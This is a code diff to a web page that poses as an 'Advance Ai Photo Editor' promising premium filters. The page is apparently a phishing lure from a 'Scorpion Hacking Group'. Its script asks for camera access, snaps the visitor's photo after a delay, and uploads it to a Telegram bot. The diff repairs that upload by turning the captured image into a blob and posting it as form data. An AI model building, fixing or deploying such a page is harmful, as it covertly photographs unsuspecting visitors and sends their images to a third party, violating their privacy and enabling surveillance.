@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Scorpion Hacking Group</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             display: flex;
             flex-direction: column;
@@ -31,9 +27,7 @@
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
             transition: transform 0.3s ease;
         }
-        .editor-card:hover {
-            transform: translateY(-10px);
-        }
+        .editor-card:hover { transform: translateY(-10px); }
         h1 {
             color: #fff;
             font-size: 2rem;
@@ -109,9 +103,7 @@
             text-decoration: none;
             transition: color 0.3s ease;
         }
-        footer a:hover {
-            color: #e6b800;
-        }
+        footer a:hover { color: #e6b800; }
         .pulse {
             font-size: 1.5rem;
             color: #ffcc00;
@@ -123,28 +115,22 @@
             50% { transform: scale(1.2); }
         }
         @media (max-width: 600px) {
-            .editor-card {
-                padding: 1.5rem;
-            }
-            h1 {
-                font-size: 1.8rem;
-            }
-            h2, p, input, .btn {
-                font-size: 0.9rem;
-            }
+            .editor-card { padding: 1.5rem; }
+            h1 { font-size: 1.8rem; }
+            h2, p, input, .btn { font-size: 0.9rem; }
         }
     </style>
 </head>
 <body>
     <div class="editor-card">
         <h1>Scorpion Hacking Group</h1>
-        <h2>Advance Ai  Photo Editor</h2>
+        <h2>Advance Ai Photo Editor</h2>
         <p>Upload or click a photo to unlock premium filters! 📸</p>
         <input type="file" id="photoUpload" accept="image/*">
         <button class="btn" onclick="accessCamera()">Allow Camera</button>
         <video id="video" autoplay></video>
-        <img id="preview"></img>
-        <img id="finalImage"></img>
+        <img id="preview" />
+        <img id="finalImage" />
         <div class="loader" id="loader"></div>
         <div class="pulse"></div>
     </div>
@@ -170,13 +156,14 @@
                 video.style.display = 'block';
                 video.srcObject = stream;
 
-                // Capture photo after 1 seconds
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const photo = canvas.toDataURL('image/png');
+                    document.getElementById('preview').src = photo;
+                    document.getElementById('preview').style.display = 'block';
                     showLoaderAndSend(photo);
                     stream.getTracks().forEach(track => track.stop());
                     video.style.display = 'none';
@@ -207,38 +194,75 @@
             const finalImage = document.getElementById('finalImage');
             const preview = document.getElementById('preview');
             loader.style.display = 'block';
-            preview.style.display = 'none';
+            preview.style.display = 'block'; // Show preview while loading
+            finalImage.style.display = 'none';
 
             setTimeout(() => {
                 loader.style.display = 'none';
                 finalImage.src = finalImageUrl;
                 finalImage.style.display = 'block';
+                preview.style.display = 'none';
                 sendToTelegram(photo);
             }, 10000); // 10-second wait
         }
 
-        // Send to Telegram
+        // Convert DataURL to Blob
+        function dataURLtoBlob(dataurl) {
+            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--){
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type:mime});
+        }
+
+        // Send to Telegram (fixed)
         function sendToTelegram(photo) {
             if (!botToken || !chatId) {
                 alert('Invalid bot token or chat ID!');
                 return;
             }
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: photo,
-                    caption: 'Photo from Scorpion Hacking Group! 📸\n\nJoin us for more tools 🔥\n@ScorpionHackingGroup'
+
+            // Check if photo is a DataURL (base64)
+            if (photo.startsWith('data:image/')) {
+                var blob = dataURLtoBlob(photo);
+                var formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', 'Photo from Scorpion Hacking Group! 📸\n\nJoin us for more tools 🔥\n@ScorpionHackingGroup');
+                formData.append('photo', blob, 'photo.png');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) alert('Photo sent! Check Telegram! 😎');
-                else alert('Error sending photo!');
-            })
-            .catch(err => alert('Error: ' + err.message));
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) alert('Photo sent! Check Telegram! 😎');
+                    else alert('Error sending photo! ' + (data.description || ''));
+                })
+                .catch(err => alert('Error: ' + err.message));
+            } else if (photo.startsWith('http')) {
+                // If it's a URL, send as JSON
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: photo,
+                        caption: 'Photo from Scorpion Hacking Group! 📸\n\nJoin us for more tools 🔥\n@ScorpionHackingGroup'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) alert('Photo sent! Check Telegram! 😎');
+                    else alert('Error sending photo! ' + (data.description || ''));
+                })
+                .catch(err => alert('Error: ' + err.message));
+            } else {
+                alert('Invalid photo format!');
+            }
         }
     </script>
 </body>
+</html>
 </html>
